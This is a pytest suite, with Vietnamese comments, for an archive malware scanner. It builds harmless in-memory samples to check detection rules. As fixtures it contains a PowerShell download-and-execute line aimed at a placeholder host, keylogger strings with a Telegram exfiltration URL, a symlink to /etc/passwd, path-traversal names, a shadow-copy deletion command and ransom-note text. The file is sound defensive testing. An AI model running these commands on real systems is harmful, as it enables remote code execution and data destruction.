"""Mọi mẫu thử đều được tạo trong bộ nhớ lúc chạy test, không có mã độc thật nào trong repo."""
import gzip
import io
import os
import json
import tarfile
import zipfile

import pytest

from archive_guard.cli import main
from archive_guard.scanner import Scanner

# Ghép chuỗi EICAR lúc chạy để antivirus trên máy bạn không xóa nhầm file test này
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()
FAKE_EXE = b"MZ" + b"\0" * 126
PS_DOWNLOADER = b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')"


def make_zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def scan(data, name="sample.zip", **kw):
    return Scanner(use_clamav=False, **kw).scan_bytes(data, name)


def rules_of(report):
    return {x.rule for f in report.files for x in f.findings}


def test_clean_zip():
    report = scan(make_zip({"readme.txt": b"xin chao", "src/app.py": b"print('hi')"}))
    assert report.verdict == "clean"
    assert not report.incomplete


def test_eicar_inside_nested_zip():
    inner = make_zip({"eicar.com": EICAR})
    report = scan(make_zip({"tools/inner.zip": inner}))
    assert report.verdict == "malicious"
    hit = [f for f in report.files if any(x.rule == "HASH.KNOWN_BAD" for x in f.findings)]
    assert hit[0].path == "sample.zip > tools/inner.zip > eicar.com"


def test_disguised_file_names():
    report = scan(make_zip({"invoice.pdf.exe": FAKE_EXE, "photo‮gpj.exe": FAKE_EXE,
                            "report.pdf": FAKE_EXE, "scan.jpg            .scr": FAKE_EXE}))
    assert {"NAME.DOUBLE_EXT", "NAME.BIDI", "NAME.CONTENT_MISMATCH", "NAME.PADDING"} <= rules_of(report)
    assert report.verdict != "clean"


def test_zip_slip():
    assert "NAME.PATH_TRAVERSAL" in rules_of(scan(make_zip({"../../evil.bat": b"echo hi"})))


def test_keylogger_indicators():
    sample = (FAKE_EXE + b"SetWindowsHookExA\0GetForegroundWindow\0[BACKSPACE][ENTER][CAPSLOCK]\0"
              + b"https://api.telegram.org/bot123:abc/sendMessage")
    report = scan(make_zip({"svchost.exe": sample}))
    assert report.verdict == "malicious"
    assert {"keylogger", "stealer"} <= set(report.categories)


def test_usb_worm_utf16_strings():
    sample = FAKE_EXE + "autorun.inf".encode("utf-16-le") + b"\0" + "GetDriveTypeW".encode("utf-16-le")
    report = scan(make_zip({"usb.exe": sample, "autorun.inf": b"[autorun]\nopen=usb.exe"}))
    assert {"WORM.USB", "NAME.AUTORUN_INF"} <= rules_of(report)
    assert "worm" in report.categories


def test_powershell_downloader():
    report = scan(make_zip({"setup.ps1": PS_DOWNLOADER}))
    assert "DOWNLOAD.EXEC_PS" in rules_of(report)
    assert report.verdict == "suspicious"


def test_zip_bomb_ratio():
    report = scan(make_zip({"big.bin": bytes(60 << 20)}))
    assert "ARCHIVE.BOMB_RATIO" in rules_of(report)


def test_total_size_limit():
    report = scan(make_zip({"a.bin": bytes(700_000), "b.bin": bytes(700_000)}), max_total_mb=1)
    assert "ARCHIVE.BOMB_TOTAL" in rules_of(report)
    assert report.incomplete


def test_nesting_depth_limit():
    data = make_zip({"x.txt": b"x"})
    for i in range(4):
        data = make_zip({f"level{i}.zip": data})
    report = scan(data, max_depth=2)
    assert "ARCHIVE.TOO_DEEP" in rules_of(report)


def _set_encrypted_flag(data):
    """zipfile chuẩn không tạo được ZIP có mật khẩu, nên bật cờ 'đã mã hóa' trực tiếp trong header."""
    b = bytearray(data)
    for sig, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        b[b.find(sig) + offset] |= 1
    return bytes(b)


def test_password_protected_executable():
    report = scan(_set_encrypted_flag(make_zip({"invoice.exe": FAKE_EXE})))
    assert "ARCHIVE.ENCRYPTED_EXEC" in rules_of(report)
    assert report.incomplete


def test_tar_gz_symlink_and_single_gz():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        info = tarfile.TarInfo("x/run.ps1")
        info.size = len(PS_DOWNLOADER)
        t.addfile(info, io.BytesIO(PS_DOWNLOADER))
        link = tarfile.TarInfo("x/passwd")
        link.type, link.linkname = tarfile.SYMTYPE, "../../../etc/passwd"
        t.addfile(link)
    assert {"DOWNLOAD.EXEC_PS", "NAME.PATH_TRAVERSAL"} <= rules_of(scan(buf.getvalue(), "a.tar.gz"))
    assert "DOWNLOAD.EXEC_PS" in rules_of(scan(gzip.compress(PS_DOWNLOADER), "run.ps1.gz"))


def make_7z(files, password=None, header_encryption=False):
    py7zr = pytest.importorskip("py7zr")
    buf = io.BytesIO()
    with py7zr.SevenZipFile(buf, "w", password=password, header_encryption=header_encryption) as z:
        for name, data in files.items():
            z.writestr(data, name)
    return buf.getvalue()


def test_7z_with_and_without_password():
    assert scan(make_7z({"eicar.com": EICAR}), "a.7z").verdict == "malicious"
    locked = make_7z({"eicar.com": EICAR}, password="infected")
    assert scan(locked, "a.7z").incomplete
    assert scan(locked, "a.7z", passwords=["sai", "infected"]).verdict == "malicious"
    hidden = make_7z({"eicar.com": EICAR}, password="infected", header_encryption=True)
    assert "ARCHIVE.ENCRYPTED" in rules_of(scan(hidden, "a.7z"))


def test_custom_yara_rule(tmp_path):
    pytest.importorskip("yara")
    rule = tmp_path / "demo.yar"
    rule.write_text('rule Demo { meta: severity = "critical" category = "trojan" description = "demo" '
                    'strings: $a = "hello-malware" condition: $a }')
    report = scan(make_zip({"x.bin": b"..hello-malware.."}), yara_paths=[rule])
    assert "YARA.Demo" in rules_of(report)
    assert report.verdict == "malicious"


def test_update_hashes_by_family(tmp_path):
    from archive_guard import malwarebazaar

    sample = b"MZ fake agent tesla sample"
    sha = __import__("hashlib").sha256(sample).hexdigest()

    def fake_query(key, form):
        assert key == "k"
        if form.get("signature") == "AgentTesla":
            return [{"sha256_hash": sha, "signature": "AgentTesla"}]
        if form.get("signature") == "Mirai":
            raise RuntimeError("illegal_signature")  # một họ lỗi không làm hỏng cả lượt
        return []

    cache = tmp_path / "mb.txt"
    assert malwarebazaar.update("k", cache, log=lambda *_: None, query=fake_query) == (1, 1)
    assert malwarebazaar.update("k", cache, log=lambda *_: None, query=fake_query) == (0, 1)
    report = scan(make_zip({"invoice.bin": sample}), hash_files=[cache])
    hit = [x for f in report.files for x in f.findings if x.rule == "HASH.KNOWN_BAD"][0]
    assert hit.category == "keylogger" and "AgentTesla" in hit.title
    assert report.verdict == "malicious"


def test_update_hashes_needs_working_key(tmp_path, monkeypatch):
    from archive_guard import malwarebazaar

    with pytest.raises(malwarebazaar.AuthError):
        malwarebazaar.update("", tmp_path / "mb.txt")

    def broken(key, form):
        raise RuntimeError("unknown_auth_key")

    with pytest.raises(RuntimeError, match="unknown_auth_key"):
        malwarebazaar.update("bad", tmp_path / "mb.txt", log=lambda *_: None, query=broken)
    assert not (tmp_path / "mb.txt").exists()
    monkeypatch.delenv("ABUSECH_AUTH_KEY", raising=False)
    assert main(["--update-hashes"]) == 3


def test_api_request_format(monkeypatch):
    from archive_guard import malwarebazaar

    seen = {}

    def fake_urlopen(req, timeout):
        seen["key"], seen["body"] = req.get_header("Auth-key"), req.data.decode()
        return io.BytesIO(json.dumps({"query_status": "ok", "data": [{"sha256_hash": "a" * 64}]}).encode())

    monkeypatch.setattr(malwarebazaar.urllib.request, "urlopen", fake_urlopen)
    rows = malwarebazaar._query("k", {"query": "get_siginfo", "signature": "AgentTesla", "limit": 1000})
    assert rows == [{"sha256_hash": "a" * 64}]
    assert seen == {"key": "k", "body": "query=get_siginfo&signature=AgentTesla&limit=1000"}


def make_pe(sections):
    """PE tối giản: header DOS + PE + bảng section [(tên, dữ liệu, characteristics)]."""
    import struct
    table = 0x40 + 24
    offset = table + 40 * len(sections)
    head = bytearray(b"MZ" + bytes(0x3A) + struct.pack("<I", 0x40) + b"PE\0\0"
                     + struct.pack("<HH", 0x14C, len(sections)) + bytes(12) + struct.pack("<HH", 0, 0))
    body = b""
    for name, data, chars in sections:
        head += name.encode().ljust(8, b"\0") + struct.pack("<IIIIIIHHI", len(data), 0, len(data),
                                                           offset + len(body), 0, 0, 0, 0, chars)
        body += data
    return bytes(head) + body


def test_packer_detection():
    import os
    code = (b"\x55\x8b\xec\x83\xec\x10" * 2000)[:8192]  # mã máy lặp lại → entropy thấp
    packed = os.urandom(8192)  # dữ liệu nén/mã hóa → entropy ~8
    exec_flag = 0x60000020
    rules = rules_of(scan(make_pe([(".text", code, exec_flag)]), "app.exe"))
    assert not {r for r in rules if r.startswith("PACKER")}
    upx = rules_of(scan(make_pe([("UPX0", b"", exec_flag), ("UPX1", packed, exec_flag)]), "app.exe"))
    assert {"PACKER.NAME", "PACKER.ENTROPY"} <= upx
    themida = scan(make_pe([(".themida", code, exec_flag)]), "app.exe")
    assert any("Themida" in x.title for f in themida.files for x in f.findings)
    assert "PACKER.ENTROPY" in rules_of(scan(make_pe([(".text", packed, exec_flag)]), "app.exe"))
    assert scan(b"MZ" + bytes(10), "broken.exe").verdict == "clean"  # header hỏng không gây lỗi


def test_payload_in_middle_of_large_file():
    import os
    from archive_guard import rules
    # payload nằm giữa file 48 MB (ngoài vùng 32 MB đầu + 4 MB cuối của bản cũ)
    # và vắt qua ranh giới hai khúc quét 8 MB
    marker = b"vssadmin delete shadows /all /quiet"
    cut = 40 * (1 << 20) - 10
    data = FAKE_EXE + os.urandom(cut - len(FAKE_EXE)) + marker + os.urandom(8 << 20)
    assert cut % rules._CHUNK != 0 and cut // rules._CHUNK != (cut + len(marker)) // rules._CHUNK
    assert "RANSOM.KILL_BACKUP" in rules_of(scan(data, "big.exe"))


def test_skipped_content_is_marked_partial(tmp_path, capsys):
    path = tmp_path / "big.zip"
    path.write_bytes(make_zip({"big.bin": os.urandom(2 << 20)}))
    assert main([str(path), "--no-clamav", "--max-size", "1", "--json", str(tmp_path / "r.json")]) == 4
    assert "KẾT LUẬN: CHƯA QUÉT ĐỦ" in capsys.readouterr().out
    report = json.loads((tmp_path / "r.json").read_text(encoding="utf-8"))["reports"][0]
    assert report["verdict"] == "incomplete" and report["complete"] is False and report["incomplete"]


@pytest.mark.parametrize("name, data", [
    ("zip mật khẩu", lambda: _set_encrypted_flag(make_zip({"hoadon.txt": b"x"}))),
    ("file nén hỏng", lambda: make_zip({"a.txt": b"x" * 100})[:60]),
    ("CAB chưa hỗ trợ", lambda: make_zip({"setup.cab": b"MSCF" + bytes(200)})),
    ("ISO chưa hỗ trợ", lambda: make_zip({"disk.bin": bytes(0x8001) + b"CD001" + bytes(100)})),
])
def test_unchecked_content_is_never_clean(name, data):
    report = scan(data())
    assert report.verdict == "incomplete", name
    assert report.incomplete


def test_engine_error_is_incomplete_not_clean_or_crash(monkeypatch):
    from archive_guard import engines

    def broken(*a):
        raise RuntimeError("yara timeout")

    monkeypatch.setattr(engines, "yara_scan", broken)
    report = scan(make_zip({"a.txt": b"hi"}))
    assert report.verdict == "incomplete"
    assert any("YARA lỗi" in x for x in report.incomplete)
    assert scan(make_zip({"invoice.pdf.exe": FAKE_EXE})).verdict == "suspicious"  # heuristic vẫn chạy


def test_cli_unexpected_crash_is_error_not_clean(tmp_path, monkeypatch):
    from archive_guard import scanner as sc

    def crash(self, path):
        raise ValueError("lỗi ngoài dự kiến")

    monkeypatch.setattr(sc.Scanner, "scan_path", crash)
    (tmp_path / "a.zip").write_bytes(make_zip({"a.txt": b"hi"}))
    assert main([str(tmp_path / "a.zip"), "--no-clamav"]) == 3


# --- Ngân sách tài nguyên: kiểm thử đối kháng bằng giới hạn nhỏ + dữ liệu vô hại -----------------

def _scanned(report):
    return sum(1 for f in report.files if f.kind != "?")


def test_byte_budget_is_shared_across_nested_levels():
    # mỗi tầng chỉ 600 KB (dưới ngưỡng 1 MB) nhưng cộng các tầng lại thì vượt
    inner = [make_zip({f"part{i}.bin": os.urandom(300_000)}) for i in range(8)]
    report = scan(make_zip({f"level/{i}.zip": z for i, z in enumerate(inner)}), max_total_mb=1)
    assert "ARCHIVE.BOMB_TOTAL" in rules_of(report)
    assert _scanned(report) < 1 + 8 * 2  # dừng sớm, không đọc hết
    assert sum(x.rule == "ARCHIVE.BOMB_TOTAL" for f in report.files for x in f.findings) == 1


def test_file_budget_is_shared_across_nested_levels():
    inner = make_zip({f"f{i}.txt": b"x" for i in range(40)})
    report = scan(make_zip({f"{i}.zip": inner for i in range(10)}), max_files=100)
    assert "ARCHIVE.TOO_MANY_FILES" in rules_of(report)
    assert len(report.files) <= 102


def test_budget_counts_actual_bytes_not_declared(monkeypatch):
    from archive_guard import scanner as sc
    from archive_guard.extract import Member
    read = []

    def lying_reader(*a, **kw):  # header khai 1 byte cho mỗi file, nhưng mỗi file thực tế 400 KB
        for i in range(20):
            read.append(i)
            yield Member(f"{i}.bin", data=os.urandom(400_000), size=1)

    monkeypatch.setattr(sc, "iter_members", lying_reader)
    report = scan(make_zip({"x": b"x"}), max_total_mb=1)
    assert "ARCHIVE.BOMB_TOTAL" in rules_of(report)
    assert len(read) == 3  # dừng ngay ở file thứ 3 (> 1 MB), bộ giải nén không được đọc tiếp


def test_7z_extracts_in_batches_within_budget(monkeypatch):
    py7zr = pytest.importorskip("py7zr")
    calls = []
    real = py7zr.SevenZipFile.extract

    def spy(self, *a, targets=None, **kw):
        calls.append(len(targets or []))
        return real(self, *a, targets=targets, **kw)

    monkeypatch.setattr(py7zr.SevenZipFile, "extract", spy)
    data = make_7z({f"{i}.bin": os.urandom(400_000) for i in range(6)})
    full = scan(data, "a.7z", max_file_mb=1)
    assert _scanned(full) == 7 and not full.incomplete
    assert max(calls[1:]) <= 2  # lần đầu dò mật khẩu; sau đó mỗi lô <= 1 MB (2 file) trong RAM
    calls.clear()
    limited = scan(data, "a.7z", max_file_mb=1, max_total_mb=1)
    assert "ARCHIVE.BOMB_TOTAL" in rules_of(limited)
    assert sum(calls[1:]) <= 3  # không giải nén các lô sau khi đã hết ngân sách


def test_time_budget(monkeypatch):
    from archive_guard import scanner as sc
    monkeypatch.setattr(sc.time, "monotonic", lambda: 1000.0)  # đồng hồ thô (Windows + Python 3.10) không nhích
    report = scan(make_zip({f"{i}.zip": make_zip({"a.txt": b"a"}) for i in range(5)}), timeout=0)
    assert "ARCHIVE.TIMEOUT" in rules_of(report)
    assert report.incomplete


def test_benchmark_metrics(tmp_path):
    from archive_guard import benchmark
    mal, ben = tmp_path / "mal" / "EICAR", tmp_path / "ben"
    mal.mkdir(parents=True), ben.mkdir()
    (mal / "a.zip").write_bytes(make_zip({"eicar.txt": EICAR}))  # chỉ bắt được nhờ mã băm
    (mal / "b.zip").write_bytes(make_zip({"notes.txt": b"hello"}))  # độc nhưng không có dấu hiệu → FN
    (ben / "c.zip").write_bytes(make_zip({"a.txt": b"hi"}))  # TN
    (ben / "d.zip").write_bytes(make_zip({"invoice.pdf.exe": FAKE_EXE}))  # FP
    res = benchmark.run(tmp_path / "mal", ben, Scanner(use_clamav=False, use_yara=False), log=lambda *_: None)
    m = res["metrics"]["suspicious"]["Tất cả"]
    assert (m["tp"], m["fn"], m["fp"], m["tn"]) == (1, 1, 1, 1)
    assert m["precision"] == m["recall"] == 0.5
    no_hash = res["metrics"]["suspicious"]["Không dùng mã băm"]
    assert no_hash["tp"] == 0 and no_hash["fn"] == 2  # EICAR chỉ bị bắt nhờ mã băm
    assert res["per_family"]["EICAR"]["n"] == 2
    assert res["per_benign_group"][""]["suspicious"] == 0.5
    lo, hi = benchmark.wilson(0, 100)
    assert lo == 0 and 0.03 < hi < 0.04  # 0/100 báo nhầm vẫn có cận trên ~3,7%
    md = benchmark.to_markdown(res)
    assert "d.zip" in md and "b.zip" in md


# --- Hợp đồng JSON (schema_version 1): chỉ được THÊM trường, không xóa/đổi tên --------------------

SCHEMA_V1 = {
    "top": {"schema_version", "version", "rules_version", "rules_components", "engines", "reports"},
    "report": {"target", "verdict", "categories", "complete", "incomplete", "files"},
    "file": {"path", "kind", "size", "sha256", "score", "verdict", "note", "findings"},
    "finding": {"rule", "severity", "category", "title", "detail", "engine"},
}


def test_json_schema_v1_is_stable(tmp_path):
    (tmp_path / "a.zip").write_bytes(make_zip({"invoice.pdf.exe": FAKE_EXE}))
    out = tmp_path / "r.json"
    main([str(tmp_path / "a.zip"), "--no-clamav", "--json", str(out)])
    d = json.loads(out.read_text(encoding="utf-8"))
    assert d["schema_version"] == 1
    report = d["reports"][0]
    file = next(f for f in report["files"] if f["findings"])
    for part, obj in [("top", d), ("report", report), ("file", file), ("finding", file["findings"][0])]:
        assert SCHEMA_V1[part] <= set(obj), f"thiếu trường {SCHEMA_V1[part] - set(obj)} ở {part}"
    assert report["verdict"] in {"clean", "incomplete", "suspicious", "malicious"}
    assert set(d["rules_components"]) == {"heuristic", "yara", "hashes", "all"}


def test_rules_version_follows_rule_content(tmp_path):
    from archive_guard.scanner import rules_fingerprint
    base = Scanner(use_clamav=False)
    assert Scanner(use_clamav=False).rules_version == base.rules_version  # ổn định giữa các lần chạy
    extra = tmp_path / "more.txt"
    extra.write_text("a" * 64 + " Demo\n")
    with_hash = Scanner(use_clamav=False, hash_files=[extra])
    assert with_hash.rules_version != base.rules_version
    assert with_hash.rules_components["heuristic"] == base.rules_components["heuristic"]
    lf, crlf = tmp_path / "lf.yar", tmp_path / "crlf.yar"
    lf.write_bytes(b"rule A {\n condition: true\n}\n")
    crlf.write_bytes(b"rule A {\r\n condition: true\r\n}\r\n")
    assert rules_fingerprint({}, [lf]) == rules_fingerprint({}, [crlf])  # checkout Windows vẫn cùng phiên bản


def test_engines_never_exceed_scan_timeout(monkeypatch, tmp_path):
    from archive_guard import engines, scanner as sc
    seen = {}
    monkeypatch.setattr(engines, "find_clamav", lambda: "clamscan")
    monkeypatch.setattr(engines, "clamav_scan", lambda path, timeout: seen.setdefault("clamav", timeout) and [])
    monkeypatch.setattr(engines, "yara_scan", lambda c, d, timeout: seen.setdefault("yara", timeout) and [])
    p = tmp_path / "a.zip"
    p.write_bytes(make_zip({"a.txt": b"hi"}))
    Scanner(timeout=5).scan_path(p)
    assert 0 < seen["clamav"] <= 5 and 1 <= seen["yara"] <= 5
    scanner = Scanner(timeout=5)
    clock = iter([0.0] + [1e9] * 100)  # lần đầu: đặt mốc; các lần sau: đã hết giờ khi tới lượt ClamAV
    monkeypatch.setattr(sc.time, "monotonic", lambda: next(clock))
    seen.clear()
    report = scanner.scan_path(p)
    assert "clamav" not in seen
    assert report.verdict != "clean" and any("ClamAV" in x for x in report.incomplete)


def test_clamav_timeout_does_not_fall_back(monkeypatch):
    import subprocess
    from archive_guard import engines
    calls = []

    def slow(cmd, **kw):
        calls.append(kw["timeout"])
        raise subprocess.TimeoutExpired(cmd, kw["timeout"])

    monkeypatch.setattr(engines.shutil, "which", lambda name: name)
    monkeypatch.setattr(engines.subprocess, "run", slow)
    assert engines.clamav_scan("x.zip", timeout=3) is None
    assert len(calls) == 1 and calls[0] <= 3  # không thử tiếp clamscan sau khi clamdscan hết giờ


# --- Hồi quy cho 2 lỗi luật tìm ra bằng benchmark (docs/BENCHMARK.md) ------------------------------

@pytest.mark.parametrize("blob, hit", [
    (b"SystemVirtualVendoredcrates\\ruff_source_file\\src\\lib.rs", False),  # chuỗi ghép của Rust (ruff)
    ("overflowedcrates\\x".encode("utf-16-le"), False),
    (b"\x00DcRat.exe\x00", True),
    (b"[DcRatBuilder] connected", True),  # phía sau tên họ được tự do
    (b"\x00AsyncRAT\x00", True),
    ("Quasar.Client.Config".encode("utf-16-le"), True),
])
def test_family_names_need_word_start(blob, hit):
    found = "BACKDOOR.KNOWN_RAT" in rules_of(scan(make_zip({"a.exe": FAKE_EXE + b"\x00" + blob})))
    assert found == hit


def test_family_name_at_chunk_boundary_keeps_context(monkeypatch):
    from archive_guard import rules
    monkeypatch.setattr(rules, "_CHUNK", 64)
    # "dcrat" bắt đầu đúng ở đầu khúc thứ hai, chữ "e" đứng trước nằm ở khúc thứ nhất → vẫn là báo nhầm
    data = b"x" * (64 - 1) + b"edcrates"
    assert "dcrat" not in rules._find_strings(data)
    assert "dcrat" in rules._find_strings(b"x" * 63 + b" dcrat")


@pytest.mark.parametrize("text, hit", [
    # thư đòi tiền chuộc thật: có lời đòi + cách trả tiền/liên lạc
    (b"All your files have been encrypted! To decrypt your files pay 0.05 Bitcoin. "
     b"Install Tor Browser and open http://abc.onion", True),
    (b"YOUR FILES ARE ENCRYPTED. Send Monero to get the decryptor.", True),
    # chuỗi trong thư viện mạng/TLS (esbuild): không có lời đòi tiền chuộc
    (b"dnsdomaingophertelnetreturn.local.onionip tls: unsupported decryption key type (%T)", False),
    (b"Bitcoin wallet library: export decryption key", False),
])
def test_ransom_note_needs_demand_and_payment(text, hit):
    found = "RANSOM.NOTE" in rules_of(scan(make_zip({"readme.exe": FAKE_EXE + text})))
    assert found == hit


# --- --isolate: worker treo/crash/hết RAM không bao giờ cho ra SẠCH ---------------------------------

def _alive(pid):
    if os.name == "nt":
        import subprocess
        out = subprocess.run(["tasklist", "/FI", f"PID eq {pid}", "/NH"], capture_output=True, text=True).stdout
        return str(pid) in out
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    try:
        with open(f"/proc/{pid}/stat") as f:
            return ") Z " not in f.read()  # tiến trình zombie coi như đã chết
    except FileNotFoundError:  # process vừa bị dọn xong (Linux), hoặc hệ điều hành không có /proc (macOS)
        return not os.path.isdir("/proc")


def _isolated_json(tmp_path, *argv):
    out = tmp_path / "r.json"
    code = main([*map(str, argv), "--isolate", "--no-clamav", "--json", str(out)])
    return code, json.loads(out.read_text(encoding="utf-8"))


def test_isolate_gives_same_result_as_in_process(tmp_path):
    (tmp_path / "bad.zip").write_bytes(make_zip({"invoice.pdf.exe": FAKE_EXE}))
    (tmp_path / "ok.zip").write_bytes(make_zip({"a.txt": b"hi"}))
    code, d = _isolated_json(tmp_path, tmp_path)
    assert code == 1 and [r["verdict"] for r in d["reports"]] == ["suspicious", "clean"]
    assert d["isolation"]["hard_timeout"] == 330


def test_isolate_passes_password_via_stdin_not_command_line(tmp_path, monkeypatch):
    from archive_guard import isolate
    seen = {}
    real = isolate.run

    def spy(cmd, stdin, *a, **kw):
        seen["cmd"], seen["stdin"] = cmd, stdin
        return real(cmd, stdin, *a, **kw)

    monkeypatch.setattr(isolate, "run", spy)
    (tmp_path / "a.7z").write_bytes(make_7z({"eicar.com": EICAR}, password="bimat123"))
    code, d = _isolated_json(tmp_path, tmp_path / "a.7z", "-p", "bimat123")
    assert code == 2 and d["reports"][0]["verdict"] == "malicious"
    assert "bimat123" not in " ".join(seen["cmd"]) and b"bimat123" in seen["stdin"]


@pytest.mark.parametrize("result, exit_code, text", [
    ((None, "", "", True), 4, "hard timeout"),            # treo → CHƯA QUÉT ĐỦ
    ((-9, "", "", False), 3, "mã thoát -9"),               # bị kill / crash → lỗi
    ((0, "", "Traceback\nMemoryError", False), 3, "MemoryError"),  # thoát nhưng không có JSON hợp lệ
])
def test_isolate_worker_failure_is_never_clean(tmp_path, monkeypatch, result, exit_code, text):
    from archive_guard import isolate
    monkeypatch.setattr(isolate, "run", lambda *a, **kw: result)
    (tmp_path / "a.zip").write_bytes(make_zip({"a.txt": b"hi"}))
    code, d = _isolated_json(tmp_path, tmp_path / "a.zip")
    report = d["reports"][0]
    assert code == exit_code and report["verdict"] == "incomplete" and not report["complete"]
    assert text in report["worker_error"]


def test_run_hard_timeout_kills_whole_process_tree(tmp_path):
    import sys
    import time
    from archive_guard import isolate
    pid_file = tmp_path / "pid"
    child = ("import subprocess, sys, time; "
             "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)']); "
             f"open({str(pid_file)!r}, 'w').write(str(p.pid)); time.sleep(120)")
    t = time.monotonic()
    code, out, err, timed_out = isolate.run([sys.executable, "-c", child], b"", timeout=3)
    assert timed_out and time.monotonic() - t < 30
    grandchild = int(pid_file.read_text())
    for _ in range(50):  # chờ hệ điều hành dọn xong
        if not _alive(grandchild):
            break
        time.sleep(0.1)
    assert not _alive(grandchild), "process cháu vẫn còn chạy sau hard timeout"


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="cần named pipe (Linux/macOS)")
def test_isolate_end_to_end_hang(tmp_path):
    import time
    os.mkfifo(tmp_path / "hang.zip")  # mở để đọc là treo mãi: mô phỏng parser bị treo
    t = time.monotonic()
    code, d = _isolated_json(tmp_path, tmp_path / "hang.zip", "--worker-timeout", "2")
    assert code == 4 and d["reports"][0]["verdict"] == "incomplete"
    assert time.monotonic() - t < 30


@pytest.mark.skipif(not __import__("archive_guard.isolate").isolate.MEMORY_SUPPORTED,
                    reason="giới hạn RAM chỉ hỗ trợ Linux và Windows")
def test_isolate_memory_limit(tmp_path):
    big = tmp_path / "big.bin"
    with open(big, "wb") as f:
        f.truncate(400 << 20)  # worker phải nạp 400 MB vào RAM, vượt giới hạn 200 MB
    code, d = _isolated_json(tmp_path, big, "--max-size", "1024", "--worker-memory", "200")
    report = d["reports"][0]
    assert code == 3 and report["verdict"] == "incomplete"
    assert "MemoryError" in report["worker_error"]


def test_worker_memory_needs_isolate():
    with pytest.raises(SystemExit):
        main(["x.zip", "--worker-memory", "100"])


def test_cli_exit_codes_and_json(tmp_path):
    (tmp_path / "clean.zip").write_bytes(make_zip({"a.txt": b"hi"}))
    (tmp_path / "bad.zip").write_bytes(make_zip({"invoice.pdf.exe": FAKE_EXE}))
    out = tmp_path / "report.json"
    assert main([str(tmp_path / "clean.zip"), "--no-clamav"]) == 0
    assert main([str(tmp_path), "--no-clamav", "--json", str(out)]) == 1
    data = json.loads(out.read_text(encoding="utf-8"))
    assert sorted(r["verdict"] for r in data["reports"]) == ["clean", "suspicious"]
    assert main([str(tmp_path / "khong-ton-tai.zip"), "--no-clamav"]) == 3
